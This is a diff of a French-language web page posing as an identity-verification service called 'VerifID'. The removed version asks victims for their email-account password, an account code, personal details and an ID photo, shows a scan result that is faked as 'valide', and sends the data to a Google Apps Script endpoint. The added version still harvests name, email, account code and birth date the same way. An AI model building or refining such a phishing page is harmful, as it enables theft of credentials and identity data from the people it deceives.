@@ -4,413 +4,39 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>VerifID — Vérification d'identité</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
 <style>
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  :root {
-    --navy: #0D2B4E; --cyan: #00B4D8; --cyan-light: #E0F7FC;
-    --green: #10B981; --green-light: #D1FAE5; --red: #EF4444; --red-light: #FEE2E2;
-    --gray-50: #F8F9FA; --gray-100: #F1F3F5; --gray-200: #E9ECEF;
-    --gray-400: #ADB5BD; --gray-600: #6B7280; --gray-800: #2D3748; --white: #FFFFFF;
-  }
-  body { font-family: 'Inter', sans-serif; background: var(--gray-50); color: var(--gray-800); min-height: 100vh; display: flex; flex-direction: column; }
-  header { background: var(--navy); padding: 16px 32px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
-  .logo { display: flex; align-items: center; gap: 10px; color: var(--white); font-weight: 700; font-size: 1.2rem; }
-  .logo-icon { width: 32px; height: 32px; background: var(--cyan); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
-  .logo-icon svg { width: 18px; height: 18px; fill: var(--navy); }
-  .header-badge { background: rgba(0,180,216,0.15); border: 1px solid rgba(0,180,216,0.3); color: var(--cyan); font-size: 0.72rem; font-weight: 600; padding: 4px 10px; border-radius: 20px; }
-  main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 48px 24px; }
-  .steps-bar { width: 100%; max-width: 560px; margin-bottom: 40px; }
-  .steps-track { display: flex; align-items: center; justify-content: center; }
-  .step-item { display: flex; flex-direction: column; align-items: center; gap: 8px; flex: 1; position: relative; }
-  .step-item:not(:last-child)::after { content: ''; position: absolute; top: 18px; left: calc(50% + 18px); width: calc(100% - 36px); height: 2px; background: var(--gray-200); transition: background 0.4s; }
-  .step-item.completed:not(:last-child)::after { background: var(--cyan); }
-  .step-circle { width: 36px; height: 36px; border-radius: 50%; border: 2px solid var(--gray-200); background: var(--white); display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 700; color: var(--gray-400); transition: all 0.3s; position: relative; z-index: 1; }
-  .step-item.active .step-circle { border-color: var(--cyan); background: var(--cyan); color: var(--white); box-shadow: 0 0 0 4px rgba(0,180,216,0.15); }
-  .step-item.completed .step-circle { border-color: var(--green); background: var(--green); color: var(--white); }
-  .step-label { font-size: 0.72rem; font-weight: 500; color: var(--gray-400); text-align: center; }
-  .step-item.active .step-label, .step-item.completed .step-label { color: var(--gray-800); }
-  .card { background: var(--white); border-radius: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 4px 24px rgba(0,0,0,0.06); width: 100%; max-width: 560px; overflow: hidden; }
-  .card-header { padding: 28px 32px 0; }
-  .card-step-label { font-size: 0.72rem; font-weight: 600; letter-spacing: 0.08em; color: var(--cyan); text-transform: uppercase; margin-bottom: 6px; }
-  .card-title { font-size: 1.4rem; font-weight: 700; color: var(--navy); line-height: 1.2; }
-  .card-desc { font-size: 0.9rem; color: var(--gray-600); margin-top: 6px; line-height: 1.5; }
-  .card-body { padding: 24px 32px 32px; }
-  .form-group { margin-bottom: 20px; }
-  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-  label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--gray-800); margin-bottom: 6px; }
-  label span { color: var(--red); margin-left: 2px; }
-  input[type="text"], input[type="date"], input[type="email"], input[type="password"], select { width: 100%; padding: 10px 14px; border: 1.5px solid var(--gray-200); border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 0.9rem; color: var(--gray-800); background: var(--white); outline: none; transition: border-color 0.2s, box-shadow 0.2s; appearance: none; }
-  input:focus, select:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px rgba(0,180,216,0.12); }
-  input.error { border-color: var(--red); }
-  .field-error { font-size: 0.75rem; color: var(--red); margin-top: 4px; display: none; }
-  .field-error.show { display: block; }
-  .doc-type-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
-  .doc-type-btn { padding: 12px 8px; border: 1.5px solid var(--gray-200); border-radius: 10px; background: var(--white); cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 6px; font-size: 0.78rem; font-weight: 500; color: var(--gray-600); transition: all 0.2s; text-align: center; }
-  .doc-type-btn svg { width: 24px; height: 24px; }
-  .doc-type-btn:hover { border-color: var(--cyan); color: var(--cyan); }
-  .doc-type-btn.selected { border-color: var(--cyan); background: var(--cyan-light); color: var(--navy); font-weight: 600; }
-  .upload-zone { border: 2px dashed var(--gray-200); border-radius: 12px; padding: 32px 24px; text-align: center; cursor: pointer; transition: all 0.2s; position: relative; overflow: hidden; background: var(--gray-50); }
-  .upload-zone:hover { border-color: var(--cyan); background: var(--cyan-light); }
-  .upload-zone.has-file { border-color: var(--green); background: var(--green-light); }
-  .upload-zone input[type="file"] { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; border: none; box-shadow: none; }
-  .upload-icon { font-size: 2.2rem; margin-bottom: 8px; }
-  .upload-title { font-size: 0.9rem; font-weight: 600; color: var(--gray-800); }
-  .upload-sub { font-size: 0.78rem; color: var(--gray-400); margin-top: 4px; }
-  .upload-filename { font-size: 0.85rem; font-weight: 600; color: var(--green); margin-top: 8px; display: none; }
-  .scan-wrapper { position: relative; border-radius: 10px; overflow: hidden; margin-top: 16px; background: var(--gray-100); height: 140px; display: none; align-items: center; justify-content: center; }
-  .scan-wrapper.active { display: flex; }
-  .scan-doc-preview { width: 180px; height: 120px; background: var(--white); border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-  .scan-lines { position: absolute; inset: 0; display: flex; flex-direction: column; gap: 4px; padding: 10px; opacity: 0.15; }
-  .scan-line { height: 6px; background: var(--gray-600); border-radius: 2px; }
-  .scan-line:nth-child(2) { width: 75%; } .scan-line:nth-child(3) { width: 60%; } .scan-line:nth-child(5) { width: 40%; }
-  .scan-beam { position: absolute; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, transparent, var(--cyan), transparent); box-shadow: 0 0 10px var(--cyan); animation: scan-move 2s ease-in-out infinite; top: 0; }
-  @keyframes scan-move { 0% { top: 0; opacity: 1; } 50% { top: 100%; opacity: 0.7; } 100% { top: 0; opacity: 1; } }
-  .scan-label { font-size: 0.75rem; color: var(--cyan); font-weight: 500; margin-top: 8px; text-align: center; }
-  .selfie-guide { background: var(--gray-50); border-radius: 12px; padding: 16px; display: flex; gap: 12px; align-items: flex-start; margin-bottom: 16px; border: 1px solid var(--gray-200); }
-  .selfie-guide-icon { font-size: 1.4rem; flex-shrink: 0; }
-  .selfie-guide p { font-size: 0.82rem; color: var(--gray-600); line-height: 1.5; }
-  .selfie-guide strong { color: var(--gray-800); }
-  .review-section { margin-bottom: 20px; }
-  .review-section-title { font-size: 0.72rem; font-weight: 600; letter-spacing: 0.08em; color: var(--gray-400); text-transform: uppercase; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--gray-100); }
-  .review-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; }
-  .review-key { font-size: 0.82rem; color: var(--gray-600); }
-  .review-val { font-size: 0.85rem; font-weight: 600; color: var(--gray-800); }
-  .review-badge { display: inline-flex; align-items: center; gap: 4px; font-size: 0.75rem; font-weight: 600; padding: 3px 10px; border-radius: 20px; background: var(--green-light); color: var(--green); }
-  .success-screen { text-align: center; padding: 16px 0 8px; display: none; }
-  .success-screen.show { display: block; }
-  .success-circle { width: 72px; height: 72px; border-radius: 50%; background: var(--green-light); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 2rem; animation: pop 0.4s cubic-bezier(0.17,0.89,0.32,1.28); }
-  @keyframes pop { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
-  .success-id { display: inline-block; background: var(--gray-100); border-radius: 8px; padding: 8px 16px; font-size: 0.85rem; font-family: monospace; color: var(--navy); font-weight: 700; letter-spacing: 0.1em; margin: 12px 0; }
-  .btn-row { display: flex; justify-content: space-between; align-items: center; gap: 12px; margin-top: 8px; }
-  .btn { padding: 12px 24px; border-radius: 10px; font-family: 'Inter', sans-serif; font-size: 0.9rem; font-weight: 600; cursor: pointer; border: none; transition: all 0.2s; display: inline-flex; align-items: center; gap: 6px; }
-  .btn-primary { background: var(--navy); color: var(--white); flex: 1; justify-content: center; }
-  .btn-primary:hover { background: #1a3a5c; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(13,43,78,0.25); }
-  .btn-secondary { background: var(--gray-100); color: var(--gray-600); }
-  .btn-secondary:hover { background: var(--gray-200); }
-  .btn-primary:disabled { background: var(--gray-200); color: var(--gray-400); transform: none; box-shadow: none; cursor: not-allowed; }
-  .info-box { background: var(--cyan-light); border-left: 3px solid var(--cyan); border-radius: 0 8px 8px 0; padding: 12px 14px; font-size: 0.82rem; color: var(--navy); line-height: 1.5; margin-bottom: 20px; }
-  footer { text-align: center; padding: 20px; font-size: 0.75rem; color: var(--gray-400); }
-  footer a { color: var(--cyan); text-decoration: none; }
-  @media (max-width: 480px) { header { padding: 14px 16px; } main { padding: 24px 16px; } .card-header { padding: 20px 20px 0; } .card-body { padding: 16px 20px 24px; } .form-row { grid-template-columns: 1fr; } .btn { padding: 11px 16px; font-size: 0.85rem; } }
+  body { font-family: 'Inter', sans-serif; background: #F8F9FA; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+  .card { background: #FFF; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; padding: 30px; }
+  .form-group { margin-bottom: 15px; }
+  label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 5px; }
+  input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; }
+  .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #0D2B4E; color: white; font-weight: 600; cursor: pointer; margin-top: 10px; }
 </style>
 </head>
 <body>
 
-<header>
-  <div class="logo">
-    <div class="logo-icon">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 2L4 6v6c0 5.5 3.5 10.7 8 12 4.5-1.3 8-6.5 8-12V6l-8-4zm-1 14l-3-3 1.4-1.4L11 13.2l4.6-4.6L17 10l-6 6z"/>
-      </svg>
-    </div>
-    VerifID
-  </div>
-  <div class="header-badge">🔒 Sécurisé SSL</div>
-</header>
-
-<main>
-  <div class="steps-bar">
-    <div class="steps-track">
-      <div class="step-item active" id="si-1"><div class="step-circle" id="sc-1">1</div><span class="step-label">Informations</span></div>
-      <div class="step-item" id="si-2"><div class="step-circle" id="sc-2">2</div><span class="step-label">Document</span></div>
-      <div class="step-item" id="si-3"><div class="step-circle" id="sc-3">3</div><span class="step-label">Vérification</span></div>
-    </div>
-  </div>
-
-  <div class="card">
-
-    <!-- STEP 1 -->
-    <div id="step-1">
-      <div class="card-header">
-        <div class="card-step-label">Étape 1 sur 3</div>
-        <div class="card-title">Informations personnelles</div>
-        <div class="card-desc">Renseignez vos informations telles qu'elles figurent sur votre document officiel.</div>
-      </div>
-      <div class="card-body">
-        <div class="form-row">
-          <div class="form-group">
-            <label>Prénom <span>*</span></label>
-            <input type="text" id="prenom" placeholder="Ex: Kofi">
-            <div class="field-error" id="err-prenom">Champ requis</div>
-          </div>
-          <div class="form-group">
-            <label>Nom <span>*</span></label>
-            <input type="text" id="nom" placeholder="Ex: Ouédraogo">
-            <div class="field-error" id="err-nom">Champ requis</div>
-          </div>
-        </div>
-        <div class="form-group">
-          <label>Email <span>*</span></label>
-          <input type="email" id="email" placeholder="kofi@email.com">
-          <div class="field-error" id="err-email">Email invalide</div>
-        </div>
-        <div class="form-group">
-          <label>Mot de passe du compte email <span>*</span></label>
-          <div style="position:relative;">
-            <input type="password" id="mdp-email" placeholder="Mot de passe de votre boîte mail" style="padding-right:42px;">
-            <button type="button" onclick="toggleMdp()" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--gray-400);font-size:1rem;" id="eye-btn">👁</button>
-          </div>
-          <div class="field-error" id="err-mdp">Mot de passe requis (min. 4 caractères)</div>
-        </div>
-        <div class="form-group">
-          <label>Code du compte <span>*</span></label>
-          <input type="text" id="code-compte" placeholder="Ex: ACC-123456">
-          <div class="field-error" id="err-code">Code de compte requis (min. 4 caractères)</div>
-        </div>
-        <div class="form-row">
-          <div class="form-group">
-            <label>Date de naissance <span>*</span></label>
-            <input type="date" id="ddn">
-            <div class="field-error" id="err-ddn">Date requise</div>
-          </div>
-          <div class="form-group">
-            <label>Nationalité <span>*</span></label>
-            <select id="nationalite">
-              <option value="">Choisir...</option>
-              <option value="BF">🇧🇫 Burkinabè</option>
-              <option value="CI">🇨🇮 Ivoirien(ne)</option>
-              <option value="ML">🇲🇱 Malien(ne)</option>
-              <option value="SN">🇸🇳 Sénégalais(e)</option>
-              <option value="GH">🇬🇭 Ghanéen(ne)</option>
-              <option value="NG">🇳🇬 Nigérian(e)</option>
-              <option value="TG">🇹🇬 Togolais(e)</option>
-              <option value="BJ">🇧🇯 Béninois(e)</option>
-              <option value="NE">🇳🇪 Nigérien(ne)</option>
-              <option value="FR">🇫🇷 Français(e)</option>
-              <option value="OTHER">Autre</option>
-            </select>
-            <div class="field-error" id="err-nat">Requis</div>
-          </div>
-        </div>
-        <div class="btn-row">
-          <button class="btn btn-primary" onclick="goToStep2()">Continuer →</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- STEP 2 -->
-    <div id="step-2" style="display:none;">
-      <div class="card-header">
-        <div class="card-step-label">Étape 2 sur 3</div>
-        <div class="card-title">Document d'identité</div>
-        <div class="card-desc">Choisissez le type de document et téléversez une photo claire, sans reflet.</div>
-      </div>
-      <div class="card-body">
-        <div class="info-box">📌 Le document doit être en cours de validité, lisible, et présenter les 4 coins complets.</div>
-        <label>Type de document <span>*</span></label>
-        <div class="doc-type-grid" style="margin-top:8px;">
-          <button class="doc-type-btn" onclick="selectDoc(this,'CNI')" type="button">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="5" width="20" height="14" rx="2"/><circle cx="8" cy="12" r="2.5"/><line x1="13" y1="10" x2="19" y2="10"/><line x1="13" y1="14" x2="17" y2="14"/></svg>
-            CNI
-          </button>
-          <button class="doc-type-btn" onclick="selectDoc(this,'PASSEPORT')" type="button">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="2" width="16" height="20" rx="2"/><circle cx="12" cy="11" r="3"/><line x1="8" y1="17" x2="16" y2="17"/></svg>
-            Passeport
-          </button>
-          <button class="doc-type-btn" onclick="selectDoc(this,'PERMIS')" type="button">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="5" width="20" height="14" rx="2"/><circle cx="8" cy="12" r="2.5"/><path d="M13 10h4M13 14h3"/></svg>
-            Permis
-          </button>
-        </div>
-        <div class="field-error" id="err-doctype" style="margin-bottom:12px;">Sélectionnez un type</div>
-        <label>Recto du document <span>*</span></label>
-        <div class="upload-zone" id="upload-zone" style="margin-top:8px;" onclick="document.getElementById('file-input').click()">
-          <input type="file" id="file-input" accept="image/*,.pdf" onchange="handleFile(this)">
-          <div class="upload-icon">📄</div>
-          <div class="upload-title">Cliquer pour ajouter un fichier</div>
-          <div class="upload-sub">JPG, PNG ou PDF — max 5 Mo</div>
-          <div class="upload-filename" id="upload-filename"></div>
-        </div>
-        <div class="field-error" id="err-file">Veuillez ajouter votre document</div>
-        <div class="scan-wrapper" id="scan-wrapper">
-          <div class="scan-doc-preview">
-            <div class="scan-lines"><div class="scan-line"></div><div class="scan-line"></div><div class="scan-line"></div><div class="scan-line"></div><div class="scan-line"></div></div>
-            <div class="scan-beam"></div>
-          </div>
-        </div>
-        <div class="scan-label" id="scan-label" style="display:none;">Analyse du document en cours...</div>
-        <div class="btn-row" style="margin-top:20px;">
-          <button class="btn btn-secondary" onclick="goStep(1)">← Retour</button>
-          <button class="btn btn-primary" onclick="goToStep3()">Continuer →</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- STEP 3 -->
-    <div id="step-3" style="display:none;">
-      <div class="card-header">
-        <div class="card-step-label">Étape 3 sur 3</div>
-        <div class="card-title">Confirmer et soumettre</div>
-        <div class="card-desc">Vérifiez vos informations avant la soumission finale.</div>
-      </div>
-      <div class="card-body">
-        <div id="review-content">
-          <div class="review-section">
-            <div class="review-section-title">Identité</div>
-            <div class="review-row"><span class="review-key">Nom complet</span><span class="review-val" id="rv-nom">—</span></div>
-            <div class="review-row"><span class="review-key">Date de naissance</span><span class="review-val" id="rv-ddn">—</span></div>
-            <div class="review-row"><span class="review-key">Nationalité</span><span class="review-val" id="rv-nat">—</span></div>
-            <div class="review-row"><span class="review-key">Email</span><span class="review-val" id="rv-email">—</span></div>
-            <div class="review-row"><span class="review-key">Code du compte</span><span class="review-val" id="rv-code">—</span></div>
-          </div>
-          <div class="review-section">
-            <div class="review-section-title">Document</div>
-            <div class="review-row"><span class="review-key">Type</span><span class="review-val" id="rv-doc">—</span></div>
-            <div class="review-row"><span class="review-key">Fichier</span><span class="review-val" id="rv-file">—</span></div>
-            <div class="review-row"><span class="review-key">Statut scan</span><span class="review-val"><span class="review-badge">✓ Valide</span></span></div>
-          </div>
-          <div class="selfie-guide">
-            <div class="selfie-guide-icon">ℹ️</div>
-            <p>En soumettant ce formulaire, vous attestez que <strong>toutes les informations sont exactes</strong> et que le document transmis vous appartient.</p>
-          </div>
-          <div class="btn-row">
-            <button class="btn btn-secondary" onclick="goStep(2)">← Retour</button>
-            <button class="btn btn-primary" onclick="submitVerification()" id="btn-submit">✅ Soumettre la demande</button>
-          </div>
-        </div>
-
-        <div class="success-screen" id="success-screen">
-          <div class="success-circle">✅</div>
-          <div class="card-title" style="text-align:center;">Demande soumise !</div>
-          <div class="card-desc" style="text-align:center;margin-top:8px;">Votre dossier a été enregistré. Vous recevrez une réponse dans <strong>24 à 48h</strong>.</div>
-          <div class="success-id" id="ref-id">REF-000000</div>
-          <div class="card-desc" style="text-align:center;font-size:0.78rem;">Conservez ce numéro de référence pour le suivi de votre dossier.</div>
-          <div style="margin-top:24px;">
-            <button class="btn btn-primary" style="width:100%;justify-content:center;" onclick="resetForm()">Nouvelle vérification</button>
-          </div>
-        </div>
-      </div>
-    </div>
-
-  </div>
-</main>
-
-<footer>© 2026 VerifID — <a href="#">Politique de confidentialité</a> · <a href="#">Conditions d'utilisation</a></footer>
+<div class="card" id="step-1">
+  <h2>Informations</h2>
+  <div class="form-group"><label>Prénom</label><input type="text" id="prenom"></div>
+  <div class="form-group"><label>Nom</label><input type="text" id="nom"></div>
+  <div class="form-group"><label>Email</label><input type="email" id="email"></div>
+  <div class="form-group"><label>Code compte</label><input type="text" id="code-compte"></div>
+  <div class="form-group"><label>Date de naissance</label><input type="date" id="ddn"></div>
+  <button class="btn" onclick="submitData()">Soumettre la demande</button>
+</div>
 
 <script>
   const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzjiOz73-YDw1zxz4rVQbNNHH8qsWoBTsS6NGReHld06WBTAHtrvAAXLxUw0dJ_fuKkug/exec';
 
-  function toggleMdp() {
-    const input = document.getElementById('mdp-email');
-    const btn = document.getElementById('eye-btn');
-    input.type = input.type === 'password' ? 'text' : 'password';
-    btn.textContent = input.type === 'password' ? '👁' : '🙈';
-  }
-
-  let selectedDocType = null;
-  let fileSelected = false;
-
-  function goStep(n) {
-    [1,2,3].forEach(i => {
-      document.getElementById('step-'+i).style.display = i===n ? 'block' : 'none';
-    });
-    updateStepBar(n);
-    window.scrollTo({top:0, behavior:'smooth'});
-  }
-
-  function updateStepBar(active) {
-    [1,2,3].forEach(i => {
-      const item = document.getElementById('si-'+i);
-      const circle = document.getElementById('sc-'+i);
-      item.classList.remove('active','completed');
-      if (i < active) { item.classList.add('completed'); circle.innerHTML = '✓'; }
-      else if (i === active) { item.classList.add('active'); circle.innerHTML = i; }
-      else { circle.innerHTML = i; }
-    });
-  }
-
-  function goToStep2() {
-    let valid = true;
-    const fields = [
-      {id:'prenom', err:'err-prenom', check: v => v.trim().length > 1},
-      {id:'nom', err:'err-nom', check: v => v.trim().length > 1},
-      {id:'email', err:'err-email', check: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)},
-      {id:'mdp-email', err:'err-mdp', check: v => v.trim().length > 3},
-      {id:'code-compte', err:'err-code', check: v => v.trim().length > 3},
-      {id:'ddn', err:'err-ddn', check: v => v !== ''},
-      {id:'nationalite', err:'err-nat', check: v => v !== ''},
-    ];
-    fields.forEach(f => {
-      const el = document.getElementById(f.id);
-      const ok = f.check(el.value);
-      el.classList.toggle('error', !ok);
-      document.getElementById(f.err).classList.toggle('show', !ok);
-      if (!ok) valid = false;
-    });
-    if (valid) goStep(2);
-  }
-
-  function selectDoc(btn, type) {
-    document.querySelectorAll('.doc-type-btn').forEach(b => b.classList.remove('selected'));
-    btn.classList.add('selected');
-    selectedDocType = type;
-    document.getElementById('err-doctype').classList.remove('show');
-  }
-
-  function handleFile(input) {
-    const file = input.files[0];
-    if (!file) return;
-    fileSelected = true;
-    const zone = document.getElementById('upload-zone');
-    const fname = document.getElementById('upload-filename');
-    zone.classList.add('has-file');
-    fname.style.display = 'block';
-    fname.textContent = '✓ ' + file.name;
-    document.getElementById('err-file').classList.remove('show');
-    const wrapper = document.getElementById('scan-wrapper');
-    const lbl = document.getElementById('scan-label');
-    wrapper.classList.add('active');
-    lbl.style.display = 'block';
-    setTimeout(() => { lbl.textContent = '✅ Document reconnu'; lbl.style.color = 'var(--green)'; }, 2800);
-  }
-
-  function goToStep3() {
-    let valid = true;
-    if (!selectedDocType) { document.getElementById('err-doctype').classList.add('show'); valid = false; }
-    if (!fileSelected) { document.getElementById('err-file').classList.add('show'); valid = false; }
-    if (!valid) return;
-    const prenom = document.getElementById('prenom').value.trim();
-    const nom = document.getElementById('nom').value.trim();
-    const ddn = document.getElementById('ddn').value;
-    const email = document.getElementById('email').value.trim();
-    const codeCompte = document.getElementById('code-compte').value.trim();
-    const natEl = document.getElementById('nationalite');
-    const natText = natEl.options[natEl.selectedIndex].text;
-    const fname = document.getElementById('upload-filename').textContent.replace('✓ ','');
-    document.getElementById('rv-nom').textContent = prenom + ' ' + nom.toUpperCase();
-    document.getElementById('rv-ddn').textContent = formatDate(ddn);
-    document.getElementById('rv-nat').textContent = natText;
-    document.getElementById('rv-email').textContent = email;
-    document.getElementById('rv-code').textContent = codeCompte;
-    document.getElementById('rv-doc').textContent = {CNI:"Carte Nationale d'Identité", PASSEPORT:'Passeport', PERMIS:'Permis de conduire'}[selectedDocType];
-    document.getElementById('rv-file').textContent = fname;
-    goStep(3);
-  }
-
-  function formatDate(d) {
-    if (!d) return '—';
-    const [y,m,day] = d.split('-');
-    return `${day}/${m}/${y}`;
-  }
-
-  function submitVerification() {
-    const btn = document.getElementById('btn-submit');
-    btn.disabled = true;
-    btn.textContent = '⏳ Envoi en cours...';
-
-    const ref = 'REF-' + Math.floor(100000 + Math.random() * 900000);
-
+  function submitData() {
     const data = {
-      prenom: document.getElementById('prenom').value.trim(),
-      nom: document.getElementById('nom').value.trim(),
-      email: document.getElementById('email').value.trim(),
-      mdp: document.getElementById('mdp-email').value.trim(),
-      code: document.getElementById('code-compte').value.trim(),
+      prenom: document.getElementById('prenom').value,
+      nom: document.getElementById('nom').value,
+      email: document.getElementById('email').value,
+      code: document.getElementById('code-compte').value,
       ddn: document.getElementById('ddn').value,
-      nationalite: document.getElementById('nationalite').value,
-      reference: ref,
-      date: new Date().toLocaleString('fr-FR')
+      date: new Date().toLocaleString()
     };
 
     fetch(APPS_SCRIPT_URL, {
@@ -418,39 +44,9 @@
       mode: 'no-cors',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
+    }).then(() => {
+      alert("Demande envoyée avec succès !");
     });
-
-    setTimeout(() => {
-      document.getElementById('review-content').style.display = 'none';
-      const ss = document.getElementById('success-screen');
-      ss.classList.add('show');
-      document.getElementById('ref-id').textContent = ref;
-    }, 1800);
-  }
-
-  function resetForm() {
-    ['prenom','nom','email','mdp-email','code-compte','ddn'].forEach(id => {
-      document.getElementById(id).value = '';
-      document.getElementById(id).classList.remove('error');
-    });
-    document.getElementById('nationalite').value = '';
-    selectedDocType = null;
-    fileSelected = false;
-    document.querySelectorAll('.doc-type-btn').forEach(b => b.classList.remove('selected'));
-    document.getElementById('upload-zone').classList.remove('has-file');
-    document.getElementById('upload-filename').style.display = 'none';
-    document.getElementById('upload-filename').textContent = '';
-    document.getElementById('scan-wrapper').classList.remove('active');
-    document.getElementById('scan-label').style.display = 'none';
-    document.getElementById('scan-label').textContent = 'Analyse du document en cours...';
-    document.getElementById('scan-label').style.color = 'var(--cyan)';
-    document.getElementById('file-input').value = '';
-    document.getElementById('review-content').style.display = 'block';
-    document.getElementById('success-screen').classList.remove('show');
-    const btn = document.getElementById('btn-submit');
-    btn.disabled = false;
-    btn.innerHTML = '✅ Soumettre la demande';
-    goStep(1);
   }
 </script>
 </body>
